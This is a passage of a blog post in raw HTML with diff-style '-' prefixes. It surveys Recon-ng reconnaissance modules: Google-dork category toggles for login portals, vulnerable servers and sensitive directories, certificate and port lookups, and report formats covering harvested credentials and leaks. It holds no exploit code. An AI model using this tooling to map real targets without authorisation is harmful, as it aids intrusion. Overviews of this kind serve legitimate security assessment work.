-</span><span class='line'>  GHDB_FOOTHOLDS                       False          yes       enable/disable the 49 dorks in this category
-</span><span class='line'>  GHDB_NETWORK_OR_VULNERABILITY_DATA   False          yes       enable/disable the 63 dorks in this category
-</span><span class='line'>  GHDB_PAGES_CONTAINING_LOGIN_PORTALS  False          yes       enable/disable the 372 dorks in this category
-</span><span class='line'>  GHDB_SENSITIVE_DIRECTORIES           False          yes       enable/disable the 119 dorks in this category
-</span><span class='line'>  GHDB_SENSITIVE_ONLINE_SHOPPING_INFO  False          yes       enable/disable the 11 dorks in this category
-</span><span class='line'>  GHDB_VARIOUS_ONLINE_DEVICES          False          yes       enable/disable the 307 dorks in this category
-</span><span class='line'>  GHDB_VULNERABLE_FILES                False          yes       enable/disable the 62 dorks in this category
-</span><span class='line'>  GHDB_VULNERABLE_SERVERS              False          yes       enable/disable the 83 dorks in this category
-</span><span class='line'>  GHDB_WEB_SERVER_DETECTION            False          yes       enable/disable the 77 dorks in this category
-</span><span class='line'>  SOURCE                               default        yes       source of input (see 'show info' for details)
-</span><span class='line'>
-</span><span class='line'>Source Options:
-</span><span class='line'>  default        SELECT DISTINCT domain FROM domains WHERE domain IS NOT NULL
-</span><span class='line'>  &lt;string&gt;       string representing a single input
-</span><span class='line'>  &lt;path&gt;         path to a file containing a list of inputs
-</span><span class='line'>  query &lt;sql&gt;    database query returning one column of inputs
-</span><span class='line'>
-</span><span class='line'>Comments:
-</span><span class='line'>  * Special thanks to the Offenvise Security crew for maintaining the GHDB and making it available to
-</span><span class='line'>  open source projects like Recon-ng. Thanks Muts!</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li><p>SSLTools.com Host Name Lookups &ndash; Uses the ssltools.com site to obtain host names from a site&rsquo;s SSL certificate metadata to update the
-&lsquo;hosts&rsquo; table.  Security issues with the certificate trust are pushed to the &lsquo;vulnerabilities&rsquo;
-table.</p></li>
-<li><p>censys.io port lookup by netblock &ndash; Queries censys.io to enumerate open ports for a netblock</p></li>
-</ul>
-
-
-<h2>Reporting</h2>
-
-<ul>
-<li><p>CSV File Creator &ndash; Creates a CSV file containing the specified harvested data</p></li>
-<li><p>HTML Report Generator &ndash; Creates a HTML report</p></li>
-</ul>
-
-
-<p>I really liked the HTML report format. It classifies data into:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>domains  
-</span><span class='line'>companies 
-</span><span class='line'>netblocks 
-</span><span class='line'>locations 
-</span><span class='line'>vulnerabilities   
-</span><span class='line'>ports 
-</span><span class='line'>hosts 
-</span><span class='line'>contacts  
-</span><span class='line'>credentials   
-</span><span class='line'>leaks 
-</span><span class='line'>pushpins  
-</span><span class='line'>profiles  
-</span><span class='line'>repositories</span></code></pre></td></tr></table></div></figure>
-
-
-<p></p>
-
-<ul>
-<li><p>JSON Report Generator &ndash; Creates a JSON report.</p></li>
-<li><p>List Creator &ndash; Creates a file containing a list of records from the database</p></li>
-<li><p>PushPin Report Generator &ndash; Creates HTML media and map reports for all of the PushPins stored in the database.</p></li>
-<li><p>XLSX File Creator &ndash; Creates an Excel compatible XLSX file containing the entire data set</p></li>
-<li><p>XML Report Generator -Creates a XML report</p></li>
-</ul>
-
-
-<p>It took a while to list everything! As you could see, the Recon-ng framework is an information gathering tool on steroids! And if you can&rsquo;t find what you need among the current modules, you can write your own and contribute!</p>
-
-<p>Until next time, here&rsquo;s the cookie straight from the cow&rsquo;s mouth:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'> ______________________________________
-</span><span class='line'>/ Q: How did you get into artificial   \
-</span><span class='line'>| intelligence? A: Seemed logical -- I |
-</span><span class='line'>\ didn't have any real intelligence.   /
-</span><span class='line'> --------------------------------------
 </span><span class='line'>        \   ^__^
 </span><span class='line'>         \  (oo)\_______
 </span><span class='line'>            (__)\       )\/\
